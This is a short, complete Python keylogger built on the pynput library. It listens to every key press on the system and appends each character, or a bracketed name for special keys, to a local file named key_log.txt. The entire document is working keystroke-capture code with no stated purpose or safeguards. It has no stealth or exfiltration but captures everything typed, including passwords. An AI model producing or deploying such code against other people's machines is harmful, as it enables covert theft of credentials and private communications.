from pynput import keyboard

# File to store keystrokes
log_file = "key_log.txt"

# Function to log each keystroke
def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")  # Records the character keys
    except AttributeError:
        # Handles special keys (like space, enter, etc.)
        with open(log_file, "a") as file:
            file.write(f"[{key}]")

# Set up listener for key press events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
